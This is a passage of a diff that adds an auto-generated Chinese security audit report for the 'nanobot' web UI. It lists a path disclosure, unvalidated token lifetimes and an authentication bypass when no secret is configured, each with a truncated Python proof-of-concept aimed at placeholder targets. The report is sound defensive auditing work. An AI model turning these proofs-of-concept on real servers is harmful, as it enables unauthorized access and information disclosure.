+                <p><strong>影响分析:</strong> 该漏洞允许攻击者获取服务器文件系统的绝对路径信息，包括项目部署路径、文件组织方式等敏感信息。虽然单个路径泄露看似影响有限，但结合多次请求可以构建完整的服务器目录结构图。这些信息可以被用于：1) 更精准的路径遍历攻击，绕过安全限制；2) 了解服务器配置和部署结构；3) 为后续的针对性攻击（如配置文件泄露、敏感数据访问）提供情报支持。在严重情况下，攻击者可能利用这些信息发现其他安全漏洞或配置弱点。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 信息泄露漏洞利用
+漏洞ID: VULN-1601310C
+仅供研究使用
+
+该PoC演示如何通过file_preview接口获取服务器文件系统的绝对路径信息。
+&quot;&quot;&quot;
+
+import requests
+import json
+import sys
+
+# 目标服务器配置
+TARGET_URL = &quot;http://target-server:port&quot;  # 替换为实际目标地址
+
+
+def exploit_file_preview_path_leak(target_url: str, file_path: str = &quot;README.md&quot;) -&gt; dict:
+    &quot;&quot;&quot;
+    利用file_preview接口获取文件绝对路径信息
+    
+    Args:
+        target_url: 目标服务器URL
+        file_path: 要预览的文件路径（相对路径）
+ </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-61CDC4C2 - 不安全的令牌过期时间处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nanobot/webui/gateway_tokens.py:53</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>expiry = time.monotonic() + float(ttl_s)</code></pre>
+                <p><strong>数据流:</strong> 用户提供的ttl_s参数 -&gt; float转换 -&gt; 与当前时间相加 -&gt; 存储为过期时间</p>
+                <p><strong>判断理由:</strong> ttl_s参数没有进行有效性验证，如果传入负数或零值，可能导致令牌立即过期或永不过期。虽然float转换会处理一些异常情况，但没有对ttl_s的范围进行限制。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过提供负数或零ttl_s导致令牌立即过期，造成拒绝服务；或提供极大ttl_s（如1e100）使令牌几乎永不过期，绕过令牌过期机制，长期持有有效令牌进行未授权访问。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-61CDC4C2 - Unsafe token expiry handling
+仅供研究使用
+&quot;&quot;&quot;
+
+import time
+import secrets
+
+# 模拟漏洞代码中的关键逻辑
+class VulnerableTokenStore:
+    def __init__(self):
+        self.issued_tokens = {}
+        self.api_tokens = {}
+
+    def issue_token(self, ttl_s):
+        token_value = f&quot;nbwt_{secrets.token_urlsafe(32)}&quot;
+        expiry = time.monotonic() + float(ttl_s)
+        self.issued_tokens[token_value] = expiry
+        return token_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-C6090437 - 不安全的认证机制 - 潜在的认证绕过</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/webui/http_utils.py:176</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>def issue_route_secret_matches(headers: Any, configured_secret: str) -&gt; bool:
+    if not configured_secret:
+        return True
+    authorization = headers.get(&quot;Authorization&quot;) or headers.get(&quot;authorization&quot;)
+    if authorization and authorization.lower().startswith(&quot;bearer &quot;):
+        supplied = authorization[7:].strip()
+        return hmac.compare_digest(supplied, configured_secret)
+    header_token = headers.get(&quot;X-Nanobot-Auth&quot;) or headers.get(&quot;x-nanobot-auth&quot;)
+    if not header_token:
+        return False
+    return hmac.compare_digest(header_token.strip(), configured_secret)</code></pre>
+                <p><strong>数据流:</strong> 用户可控的Authorization头或X-Nanobot-Auth头 -&gt; issue_route_secret_matches() -&gt; 与配置的密钥比较 -&gt; 返回是否匹配</p>
+                <p><strong>判断理由:</strong> 该函数存在多个安全风险：1) 如果 `configured_secret` 为空字符串，函数直接返回 `True`，这意味着未配置密钥时所有请求都会通过认证；2) 函数同时支持 `Authorization` 头和 `X-Nanobot-Auth` 头，增加了攻击面；3) 使用 `hmac.compare_digest()` 进行常量时间比较是正确的做法，但token的提取和清理（`strip()`）可能改变token值；4) 如果 `Authorization` 头中的token以空格开头或包含特殊字符，`strip()` 可能会改变token值。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 完全绕过API认证机制，未授权访问所有受保护的端点；2) 攻击者可以执行任意管理操作，包括但不限于查看敏感数据、修改系统配置、执行远程命令等；3) 如果configured_secret为空，所有请求都将通过认证，系统完全暴露；4) 即使配置了密钥，同时支持两个认证头增加了攻击面，攻击者可以尝试不同的组合来绕过认证。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-C6090437 - 不安全的认证机制导致的认证绕过
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 目标URL（请替换为实际测试目标）
+TARGET_URL = &quot;http://target.example.com/api/sensitive-endpoint&quot;
+
+def exploit_empty_secret(target_url):
+    &quot;&quot;&quot;
+    利用方式1：当configured_secret为空时，无需任何认证头即可绕过
+    &quot;&quot;&quot;
+    print(f&quot;[*] 尝试利用空密钥绕过认证 - 目标: {target_url}&quot;)
+    print(&quot;[*] 发送不带任何认证头的请求...&quot;)
+    
+    try:
+        response = req</code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-12 00:05:04</p>
+</div>
+</body>
+</html>
